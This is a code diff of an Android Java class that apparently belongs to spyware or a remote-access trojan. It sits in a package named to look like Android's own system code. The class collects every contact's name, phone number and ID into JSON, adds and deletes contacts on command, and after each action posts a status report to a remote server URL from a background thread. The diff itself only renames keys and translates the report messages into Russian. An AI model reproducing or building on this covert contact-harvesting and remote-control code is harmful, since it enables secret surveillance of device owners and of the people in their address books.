@@ -13,6 +13,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import oom.android.system.Managers.base;
 import oom.android.system.app.HttpPoster;
 import oom.android.system.app.MyService;
 
@@ -34,15 +35,15 @@ public class ContactsManager {
                 Mcontact.setPhone(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                 Mcontact.setId(cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID)));
 
-                contact.put("phoneNumber", Mcontact.getPhone());
-                contact.put("name", Mcontact.getName());
-                contact.put("raw_id",Mcontact.getId());
+                contact.put(base.CONTACTS.CONTACT_PHONE, Mcontact.getPhone());
+                contact.put(base.CONTACTS.CONTACT_NAME, Mcontact.getName());
+                contact.put(base.CONTACTS.CONTACT_ID,Mcontact.getId());
                 list.put(contact);
 
             }
             contacts.put("contactsList", list);
             cur.close();
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Список обновлён (нажмите Ctrl +f5)");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Список обновлён");
             new Thread(uploader).start();
             return contacts;
         } catch (JSONException e) {
@@ -81,7 +82,7 @@ public class ContactsManager {
 
             MyService.getContext().getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
 
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]MContact added successfully");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Контакт добавлен");
             new Thread(uploader).start();
         }catch (Exception e){}
 
@@ -93,7 +94,7 @@ public class ContactsManager {
             String wh = ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY+"=? AND "+ ContactsContract.RawContacts._ID+"=?";
             String[] args = new String[]{name,RawId};
             MyService.getContext().getContentResolver().delete(ContactsContract.RawContacts.CONTENT_URI,wh, args);
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]MContact deleted successfully");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Contacts]Контакт удален");
             new Thread(uploader).start();
         }catch (Exception e){}
 
